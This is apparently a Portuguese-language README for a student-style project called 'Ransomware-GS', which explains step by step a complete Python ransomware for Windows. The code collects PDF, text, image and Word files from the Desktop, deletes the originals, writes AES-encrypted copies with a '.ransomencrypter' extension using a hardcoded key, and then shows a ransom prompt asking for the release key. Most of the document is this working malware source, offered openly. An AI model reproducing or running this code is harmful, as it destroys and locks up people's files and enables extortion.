# Ransomware-GS
 Descrição do funcionamento do ransomware.
 
 
Esse ransomware foi feito para funcionar em windows.


 Primeiramente precisamos fazer os imports necessários 
 
 
import os  # sistema operacional


import glob  # busca os arquivos


import time


import pyaes  # biblioteca de criptografia aes

 
from pathlib import Path  # pathlib utilizada para setar os caminhos
Após fazer os imports podemos começar a programar o código propriamente dito.
 
Aqui nós estamos listando as extensões dos tipos de arquivos que queremos criptografar, e exibir a mensagem que estamos criptografando.

lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]

print('Criptografando')

time.sleep(3)
 
Aqui estamos confirmando que os arquivos que tem que ser criptografados existem, nesse código eu escolhi criptografar os arquivos existentes no desktop.
try:

    desktop = Path.home() / "Desktop"
except Exception:
    pass
os.chdir(desktop)
 
Aqui é onde a criptografia ocorre, esse é o núcleo do nosso código, primeiro de tudo ele vai abrir os arquivos que foram identificados anteriormente, usando o ‘rb’ que significa read binary ou seja ele está lendo os bytes daquele arquivo, depois disso ele remove os arquivos do desktop e os criptografá, usando a chave de criptografia definida por meio do pyaes utilizando o AES para criptografar o arquivo, o AES é extremamente simples de ser utilizado por isso ele foi a escolha para esse código, e depois de criptografado os arquivos retornam para o desktop como .ransomencrypter
 
def criptografando():

    for arquivos in lst_arqui:
        for format_arqui in glob.glob(arquivos):
            print(format_arqui)
            A = open(f'{desktop}\\{format_arqui}', 'rb')  # rb = read binary e wb = write binary
            data_arqui = A.read()
            A.close()
            os.remove(f'{desktop}\\{format_arqui}')
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
            crypto_data = aes.encrypt(data_arqui)
            novo_arqui = format_arqui + ".ransomencrypter"
            novo_arqui = open(f'{desktop}\\{novo_arqui}', 'wb')
            novo_arqui.write(crypto_data)
            novo_arqui.close()
 
Este é o nosso descrypt ele é o responsável por fazer o processo inverso ao anterior e descriptografar o arquivo, primeiro ele checa se os arquivos são um .ransomencrypter e os le e então utilizando a chave ele descriptografa os arquivos e retorna eles para o estado anterior como se nada tivesse acontecido
 
 def descrypt(decrypt_file):
   try:
   
       for arquivo in glob.glob('*.ransomencrypter'):
            keybytes = decrypt_file.encode()
            name_arquivo = open(arquivo, 'rb')
            data_arqui = name_arquivo.read()
            akey = keybytes
            aaes = pyaes.AESModeOfOperationCTR(akey)  # gera a decriptografia
            decrypt_data = aaes.decrypt(data_arqui)

            format_file = arquivo.split('.')
            new_nome_arquivo = format_file[0] + '.' + format_file[1]

            dnovo_arquivo = open(f'{desktop}\\{new_nome_arquivo}', 'wb')
            dnovo_arquivo.write(decrypt_data)
            dnovo_arquivo.close()
    except ValueError as err:
        print('Chave errada, que pena ;(')
        
Aqui é onde a mensagem de criptografia é exibida assim que os arquivos forem encriptados e pede pela chave de liberação 'Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:', se a chave estiver correta ele descriptografa os arquivos e se ela não estiver correta ele exibe a mensagem 'Chave de liberação inválida.', e caso ela esteja correta o código se encerra. 
 
 
 
if __name__ == '__main__':

    criptografando()
    if criptografando:
        key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
            descrypt(key)
            for del_file in glob.glob('*.ransomencrypter'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida, que pena ;(')
